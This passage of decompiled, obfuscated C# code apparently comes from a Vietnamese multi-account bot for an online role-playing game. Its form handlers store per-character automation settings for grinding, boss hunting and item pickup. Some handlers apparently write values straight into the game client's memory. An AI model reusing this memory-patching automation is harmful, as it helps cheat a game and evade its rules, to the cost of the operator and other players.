			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_26 = Convert.ToByte(checkBoxTucheHT.Checked);
				checkBoxTDPHettien.Enabled = characterAccountConfig_1[num].int_26 > 0;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTuGiaiBua_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_80 = Convert.ToByte(checkBoxTuGiaiBua.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTNXuatChieu120_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_83 = Convert.ToByte(checkBoxTNXuatChieu120.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonSkill120vd_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormTuychon.int_1 = 0;
				FormTuychon.int_0 = characterAccountConfig_1[num].int_136;
				FormTuychon formTuychon = new FormTuychon();
				formTuychon.Show();
			}
		}
		catch
		{
		}
	}

	private void buttonSkill120tn_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_1 = 1;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void buttonDanhsachCuusat_Click(object sender, EventArgs e)
	{
		if (FormCuuSat.bool_0)
		{
			FormCuuSat.bool_0 = false;
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			FormTip.smethod_0("HUONG DAN", "Bạn hãy chọn 1 ac rồi bấm nút Lập danh sách để thiết lập.", 4000, 250, 80);
			return;
		}
		FormCuuSat.int_0 = characterAccountConfig_1[num].int_136;
		try
		{
			FormCuuSat formCuuSat = new FormCuuSat();
			formCuuSat.int_1 = base.Left;
			formCuuSat.int_2 = base.Top;
			formCuuSat.int_3 = base.Width;
			formCuuSat.int_4 = base.Height;
			formCuuSat.Show();
		}
		catch
		{
		}
	}

	private void checkBoxDanhquaiTrain_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_27 = Convert.ToByte(checkBoxDanhquaiTrain.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTDPHettien_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_28 = Convert.ToByte(checkBoxTDPHettien.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxToadoVong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_29 = Convert.ToByte(checkBoxToadoVong.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void linkLabelPhimChaynhim_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		string text = "https://youtu.be/72eBN2IrG5Q";
		Class24.smethod_40(Class66.smethod_0(), "", text, 0);
		string text2 = "Xem video hướng dẫn tại: " + Class56.string_7 + text;
		FormTip.smethod_0(string_49, text2, 600000, 250, 80);
	}

	private void textBoxTenacTimVST_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			string_11 = textBoxTenacTimVST.Text;
			Class66.smethod_11(Class66.smethod_1(), "TenAcCantimVST", Class11.smethod_16(string_11), "", 0);
		}
	}

	private void checkBoxBaokenhbang_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_45 = Convert.ToByte(checkBoxBaokenhbang.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagBaoKenhBangVST", int_45, "", 0);
		}
	}

	private void textBoxThoigianVST_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_47 = Class11.smethod_11(textBoxThoigianVST.Text);
			if (int_47 < 1)
			{
				int_47 = 1;
			}
			Class66.smethod_11(Class66.smethod_1(), "ThoigianVST", int_47, "", 0);
		}
	}

	private void buttonPasteVST_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Clipboard.GetText();
			if (text != null && !(text == string.Empty))
			{
				text = text.Replace("/", "").Replace(" ", "");
				textBoxTenacTimVST.Text = text;
			}
		}
		catch
		{
		}
	}

	private void buttonCopyVST_Click(object sender, EventArgs e)
	{
		try
		{
			if (textBoxToadoVST.Text != null && textBoxToadoVST.Text != string.Empty)
			{
				Clipboard.SetText(textBoxToadoVST.Text);
			}
		}
		catch
		{
		}
	}

	private void checkBoxRoom_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_46 = Convert.ToByte(checkBoxRoom.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagBaoKenhRoomVST", int_46, "", 0);
		}
	}

	private void checkBoxCungMucTieu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_37 = Convert.ToByte(checkBoxCungMucTieu.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagCungMuctieu", int_37, "", 0);
		}
	}

	private void buttonMuctieu_Click(object sender, EventArgs e)
	{
		if (FormTuychon.bool_0)
		{
			FormTuychon.bool_0 = false;
			return;
		}
		try
		{
			FormTuychon.int_1 = 202;
			FormTuychon formTuychon = new FormTuychon();
			formTuychon.Show();
		}
		catch
		{
		}
	}

	private void textBoxNhapSLTest_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormLocdoTest.int_2 = Class11.smethod_11(textBoxNhapSLTest.Text);
			Class66.smethod_11(Class66.smethod_1(), "NhapSoluongTest", FormLocdoTest.int_2, "", 0);
		}
	}

	private void textBoxNhapSoluongClickNPC_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormClickNPC.int_6 = Class11.smethod_11(textBoxNhapSoluongClickNPC.Text);
			Class66.smethod_11(Class66.smethod_1(), "iNhapSoluongClickNPC", FormClickNPC.int_6, "", 0);
		}
	}

	private void checkBoxNhapSLClickNpc_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			FormClickNPC.int_5 = Convert.ToByte(checkBoxNhapSLClickNpc.Checked);
			Class66.smethod_11(Class66.smethod_1(), "fNhapSoluongClickNPC", FormClickNPC.int_5, "", 0);
		}
	}

	private void checkBoxDanhQuaiTrenduongdi_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_30 = Convert.ToByte(checkBoxDanhQuaiTrenduongdi.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxQuayquai_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_31 = Convert.ToByte(checkBoxQuayquai.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private int method_28(ComboBox comboBox_0, GStruct58[] gstruct58_0)
	{
		string text = comboBox_0.Text;
		if (gstruct58_0 != null)
		{
			for (int i = 0; i < gstruct58_0.Length; i++)
			{
				if (gstruct58_0[i].string_0 == text)
				{
					return gstruct58_0[i].int_1;
				}
			}
		}
		return 0;
	}

	private void buttonLogin_Click(object sender, EventArgs e)
	{
		if (FormLogin.bool_0)
		{
			FormLogin.bool_0 = false;
			return;
		}
		try
		{
			FormLogin formLogin = new FormLogin();
			formLogin.int_0 = base.Left;
			formLogin.int_1 = base.Top;
			formLogin.int_2 = base.Width;
			formLogin.int_3 = base.Height;
			formLogin.Show();
		}
		catch
		{
		}
	}

	private void buttonFixGameTuthoat_Click(object sender, EventArgs e)
	{
		if (FormCompatibility.bool_0)
		{
			FormCompatibility.bool_0 = false;
			return;
		}
		try
		{
			FormCompatibility formCompatibility = new FormCompatibility();
			formCompatibility.int_0 = Cursor.Position.X;
			formCompatibility.int_1 = Cursor.Position.Y;
			formCompatibility.int_2 = base.Width;
			formCompatibility.int_3 = base.Height;
			formCompatibility.Show();
		}
		catch
		{
		}
	}

	private void checkBoxGameHu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_73 = Convert.ToByte(checkBoxGameHu.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagLoaiboGameHu", int_73, "", 0);
		}
	}

	private void checkBoxTranphai1_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_140[0] = Convert.ToByte(checkBoxTranphai1.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTranphai2_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_141[0] = Convert.ToByte(checkBoxTranphai2.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTranphai3_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_142[0] = Convert.ToByte(checkBoxTranphai3.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxTranphai1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_140[1] = method_28(comboBoxTranphai1, characterAccountConfig_1[num].gstruct58_0);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxTranphai2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_141[1] = method_28(comboBoxTranphai2, characterAccountConfig_1[num].gstruct58_0);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxTranphai3_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_142[1] = method_28(comboBoxTranphai3, characterAccountConfig_1[num].gstruct58_0);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTranphai1_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_140[2] = Class11.smethod_11(textBoxTranphai1.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTranphai2_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_141[2] = Class11.smethod_11(textBoxTranphai2.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxTranphai3_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_142[2] = Class11.smethod_11(textBoxTranphai3.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxChuyenThuoc_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || characterAccountConfig_1 == null)
		{
			return;
		}
		bool_23 = false;
		string_23 = null;
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (0 <= num)
		{
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			int[] array = new int[1];
			Class85.smethod_38(characterAccountConfig, ref string_23, -1, array);
		}
		else
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				CharacterAccountConfig characterAccountConfig2 = characterAccountConfig_1[i];
				int[] array2 = new int[1];
				Class85.smethod_38(characterAccountConfig2, ref string_23, -1, array2);
			}
		}
		if (string_23 != null)
		{
			Array.Sort(string_23);
			comboBoxChuyenThuoc.Items.Clear();
			for (int j = 0; j < string_23.Length; j++)
			{
				comboBoxChuyenThuoc.Items.Add(Class1.smethod_1(string_23[j], 1));
			}
		}
		Thread.Sleep(10);
		bool_23 = true;
	}

	private void comboBoxChuyenThuoc_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || string_23 == null)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxChuyenThuoc.Text;
		for (int i = 0; i < string_23.Length; i++)
		{
			if (text == Class1.smethod_1(string_23[i], 1))
			{
				characterAccountConfig_1[num].string_14 = string_23[i];
				Class56.smethod_13(characterAccountConfig_1[num]);
				break;
			}
		}
	}

	private void checkBoxTubaoDanh_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_48[0] = Convert.ToByte(checkBoxTubaoDanh.Checked);
		}
	}

	private void comboBoxVaodiemBaodanh_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		string text = comboBoxVaodiemBaodanh.Text;
		for (int i = 0; i < string_32.Length; i++)
		{
			if (text == string_32[i])
			{
				if (int_48[1] != i)
				{
					int_48[1] = i;
					Class66.smethod_11(Class66.smethod_1(), "BaodanhTK", int_48[1], "", 0);
				}
				break;
			}
		}
	}

	private void checkBoxVaomapAchinh_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_49 = Convert.ToByte(checkBoxVaomapAchinh.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagVaoMapCTCCoAcchinh", int_49, "", 0);
		}
	}

	private void buttonTuTimWeb_Click(object sender, EventArgs e)
	{
		if (string_7 == null)
		{
			return;
		}
		if (FormTutim.bool_0)
		{
			FormTutim.bool_0 = false;
			return;
		}
		try
		{
			FormTutim formTutim = new FormTutim();
			formTutim.int_0 = base.Left;
			formTutim.int_1 = base.Top;
			formTutim.int_2 = base.Width;
			formTutim.int_3 = base.Height;
			formTutim.Show();
		}
		catch
		{
		}
	}

	private void checkBoxTatMuamauTK_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_97 = Convert.ToByte(checkBoxTatMuamauTK.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagTatMuamauTK", int_97, "", 0);
		}
	}

	private void buttonToadoPK_Click(object sender, EventArgs e)
	{
		if (FormPhongKy1.bool_0)
		{
			FormPhongKy1.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormPhongKy1.int_4 = characterAccountConfig_1[num].int_136;
				FormPhongKy1 formPhongKy = new FormPhongKy1();
				formPhongKy.int_0 = base.Left;
				formPhongKy.int_1 = base.Top;
				formPhongKy.int_2 = base.Width;
				formPhongKy.int_3 = base.Height;
				formPhongKy.Show();
			}
		}
		catch
		{
		}
	}

	private void checkBoxBatdauVanSuthong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].bool_54 = checkBoxBatdauVanSuthong.Checked;
			}
		}
	}

	private void buttonPhimTat_Click(object sender, EventArgs e)
	{
		if (FormPhimtat.bool_0)
		{
			FormPhimtat.bool_0 = false;
			return;
		}
		try
		{
			FormPhimtat formPhimtat = new FormPhimtat();
			formPhimtat.int_0 = Cursor.Position.X;
			formPhimtat.int_1 = Cursor.Position.Y;
			formPhimtat.int_2 = base.Width;
			formPhimtat.int_3 = base.Height;
			formPhimtat.Show();
		}
		catch
		{
		}
	}

	private void checkBoxNhatqua_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int num2 = Convert.ToByte(checkBoxNhatqua.Checked);
				int num3 = characterAccountConfig_1[num].gstruct49_0.int_6;
				characterAccountConfig_1[num].gstruct49_0.int_0 = num2;
				uint[] array = Class38.smethod_30(characterAccountConfig_1[num]);
				characterAccountConfig_1[num].gstruct49_0.int_9 = (int)array[0];
				characterAccountConfig_1[num].gstruct49_0.int_10 = (int)array[1];
				CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
				Class75.smethod_2(characterAccountConfig, Class75.uint_13, num2, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_14, num3, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_15, characterAccountConfig.gstruct49_0.int_8, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_16, characterAccountConfig.gstruct49_0.int_9, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_16 + 1, characterAccountConfig.gstruct49_0.int_10, 4);
				Class75.smethod_2(characterAccountConfig, Class75.uint_16 + 2, Class39.smethod_0(characterAccountConfig), 4);
			}
		}
	}

	private void checkBoxBossSatthu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_133[0] = Convert.ToByte(checkBoxBossSatthu.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void sanboss1cho_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	public static bool smethod_3()
	{
		try
		{
			foreach (Form openForm in Application.OpenForms)
			{
				if (openForm is Form1 form2)
				{
					return form2.sanboss1cho.Checked;
				}
			}
		}
		catch
		{
		}
		return false;
	}

	private void comboBoxTinSu_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		int num2 = 0;
		string text = comboBoxTinSu.Text;
		for (int i = 0; i < string_33.Length; i++)
		{
			if (text == string_33[i])
			{
				num2 = i;
				break;
			}
		}
		characterAccountConfig_1[num].int_20[1] = num2;
		method_29(num2 > 0 && characterAccountConfig_1[num].int_20[0] <= 0);
		checkBoxChoPTdanhsach.Enabled = num2 == 0;
		comboBoxTinSu.Enabled = num2 == 0;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void checkBoxChayTinsu_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				int num2 = Convert.ToByte(checkBoxChayTinsu.Checked);
				characterAccountConfig_1[num].int_20[0] = num2;
				method_29(num2 <= 0 && characterAccountConfig_1[num].int_20[1] > 0);
				comboBoxTinSu.Enabled = num2 <= 0;
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void method_29(bool bool_35)
	{
		checkBoxMuathuocPK.Enabled = bool_35;
		checkBoxChaydanhvong.Enabled = bool_35;
		checkBoxChayPKNguoidung.Enabled = bool_35;
		buttonToadoPK.Enabled = bool_35;
	}

	private void checkBoxONha_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_133[4] = Convert.ToByte(checkBoxONha.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxBosSatthu_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxBosSatthu.Text;
		int num2 = 0;
		while (true)
		{
			if (num2 < Class5.struct28_0.Length)
			{
				if (text == Class5.struct28_0[num2].bossDisplayName)
				{
					break;
				}
				num2++;
				continue;
			}
			return;
		}
		characterAccountConfig_1[num].int_133[3] = num2;
		Class56.smethod_13(characterAccountConfig_1[num]);
	}

	private void buttonSatthuAll_Click(object sender, EventArgs e)
	{
		int num = 0;
		string text = comboBoxBosSatthu.Text;
		for (int i = 0; i < Class5.struct28_0.Length; i++)
		{
			if (text == Class5.struct28_0[i].bossDisplayName)
			{
				num = i;
				break;
			}
		}
		int num2 = Convert.ToByte(checkBoxBossSatthu.Checked);
		int num3 = Convert.ToByte(checkBoxONha.Checked);
		if (characterAccountConfig_1 != null)
		{
			for (int j = 0; j < characterAccountConfig_1.Length; j++)
			{
				characterAccountConfig_1[j].int_133[0] = num2;
				characterAccountConfig_1[j].int_133[3] = num;
				characterAccountConfig_1[j].int_133[4] = num3;
				Class56.smethod_13(characterAccountConfig_1[j]);
			}
		}
	}

	private void buttonNhatquaAll_Click(object sender, EventArgs e)
	{
		string text = null;
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (0 <= num)
		{
			text = characterAccountConfig_1[num].gstruct49_0.string_0;
		}
		int num2 = Convert.ToByte(checkBoxNhatqua.Checked);
		int num3 = Convert.ToByte(checkBoxGioClick.Checked);
		int num4 = (int)numericUpDownHH.Value;
		int num5 = (int)numericUpDownMM.Value;
		int num6 = (int)numericUpDownSS.Value;
		int num7 = Class11.smethod_11(textBoxPhamviNhatqua.Text);
		int num8 = Convert.ToByte(checkBoxThanhTruot.Checked);
		int num9 = Class11.smethod_11(textBoxThoiGianTruot.Text);
		int num10 = Convert.ToByte(checkBoxDungCodinh.Checked);
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (text != null && text != string.Empty && i != num)
			{
				characterAccountConfig_1[i].gstruct49_0.string_0 = text;
			}
			characterAccountConfig_1[i].gstruct49_0.int_0 = num2;
			characterAccountConfig_1[i].gstruct49_0.int_2 = num3;
			characterAccountConfig_1[i].gstruct49_0.int_3 = num4;
			characterAccountConfig_1[i].gstruct49_0.int_4 = num5;
			characterAccountConfig_1[i].gstruct49_0.int_5 = num6;
			characterAccountConfig_1[i].gstruct49_0.int_1 = num7;
			characterAccountConfig_1[i].gstruct49_0.int_6 = num8;
			characterAccountConfig_1[i].gstruct49_0.int_7 = num9;
			characterAccountConfig_1[i].gstruct49_0.int_8 = num10;
			uint[] array = Class38.smethod_30(characterAccountConfig_1[i]);
			characterAccountConfig_1[i].gstruct49_0.int_9 = (int)array[0];
			characterAccountConfig_1[i].gstruct49_0.int_10 = (int)array[1];
			Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_15, num10, 4);
			Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_16, characterAccountConfig_1[i].gstruct49_0.int_9, 4);
			Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_16 + 1, characterAccountConfig_1[i].gstruct49_0.int_10, 4);
			Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_16 + 2, Class39.smethod_0(characterAccountConfig_1[i]), 4);
			Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_13, num2, 4);
			Class75.smethod_2(characterAccountConfig_1[i], Class75.uint_14, num8, 4);
			Class56.smethod_13(characterAccountConfig_1[i]);
		}
	}

	private void buttonTinsuAll_Click(object sender, EventArgs e)
	{
		int num = 0;
		int num2 = Convert.ToByte(checkBoxChayTinsu.Checked);
		bool flag = checkBoxMuathuocPK.Checked;
		bool flag2 = checkBoxChaydanhvong.Checked;
		string text = comboBoxTinSu.Text;
		for (int i = 0; i < string_33.Length; i++)
		{
			if (text == string_33[i])
			{
				num = i;
				break;
			}
		}
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int j = 0; j < characterAccountConfig_1.Length; j++)
		{
			if (num > 1)
			{
				characterAccountConfig_1[j].bool_5 = flag;
				characterAccountConfig_1[j].bool_4 = flag2;
			}
			characterAccountConfig_1[j].int_20[1] = num;
			characterAccountConfig_1[j].int_20[0] = num2;
			Class56.smethod_13(characterAccountConfig_1[j]);
		}
	}

	private void checkBoxKhongLuuruong_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class5.int_1 = Convert.ToByte(checkBoxKhongLuuruong.Checked);
			Class66.smethod_11(Class66.smethod_1(), "BosSatthuKhongLuuRuong", Class5.int_1, "", 0);
		}
	}

	private void checkBoxGhepSTG_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class5.int_2 = Convert.ToByte(checkBoxGhepSTG.Checked);
			Class66.smethod_11(Class66.smethod_1(), "TuGhepSTG", Class5.int_2, "", 0);
		}
	}

	private void buttonGhepSTG_Click(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
		if (!characterAccountConfig.bool_25)
		{
			return;
		}
		if (characterAccountConfig.int_133[0] <= 0)
		{
			if (int_24 == 0)
			{
				Class5.int_3 = characterAccountConfig.int_136;
				new Thread(Class5.smethod_2).Start();
			}
			else
			{
				string text = "Chức năng này chỉ sử dụng được khi ở chế độ WAR.";
				FormTip.smethod_0(string_49, text, 600000, 300, 80, bool_8: false, base.Left, base.Top);
			}
		}
		else
		{
			string text2 = "Ac đang chạy boss sát thủ, chỉ cần check vào mục [v] Tự ghép STG, thì khi nào ac về thành nhận nhiệm vụ lúc đó ac sẽ tự ghép Sát thủ giản luôn.";
			FormTip.smethod_0(string_49, text2, 600000, 400, 140, bool_8: false, base.Left, base.Top);
		}
	}

	private void checkBoxBossSTtuhuy_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			Class5.int_0 = Convert.ToByte(checkBoxBossSTtuhuy.Checked);
			Class66.smethod_11(Class66.smethod_1(), "BosSatthuTuHuyNhiemvu", Class5.int_0, "", 0);
			if (Class5.int_0 > 0)
			{
				string text = "Tự hủy nhiệm vụ hiện tại và nhận nhiệm vụ mới. Điều kiện để auto tự Kích hoạt tự hủy nhiệm vụ là:||- Đây là ac không có tổ đội, hoặc là đội trưởng|- Ac đang đứng nơi vị trí boss xuất hiện.|- Sau 60 giây nếu boss không xuất hiện thì sẽ tự hủy.||Do vậy, nếu đang săn boss tổ đội thì ac đội trưởng (chủ PT) phải đi săn boss luôn chứ không được ở nhà nhé.";
				FormTip.smethod_0(string_49, text, 600000, 360, 200, bool_8: false, base.Left, base.Top);
			}
		}
	}

	private void buttonNgaMybuff_Click(object sender, EventArgs e)
	{
		if (FormNgamyBuff.bool_0)
		{
			FormNgamyBuff.bool_0 = false;
			return;
		}
		try
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				FormNgamyBuff.int_4 = characterAccountConfig_1[num].int_136;
				FormNgamyBuff formNgamyBuff = new FormNgamyBuff();
				formNgamyBuff.int_0 = Cursor.Position.X;
				formNgamyBuff.int_1 = Cursor.Position.Y;
				formNgamyBuff.int_2 = base.Width;
				formNgamyBuff.int_3 = base.Height;
				formNgamyBuff.Show();
			}
		}
		catch
		{
		}
	}

	private void checkBoxGopVatpham_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_78 = Convert.ToByte(checkBoxGopVatpham.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagMuaGop", int_78, "", 0);
		}
	}

	private void checkBoxMuaKytrancac_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int_77 = Convert.ToByte(checkBoxMuaKytrancac.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagMuaKTC", int_77, "", 0);
		}
	}

	private void comboBoxMuaVatpham_MouseDown(object sender, MouseEventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
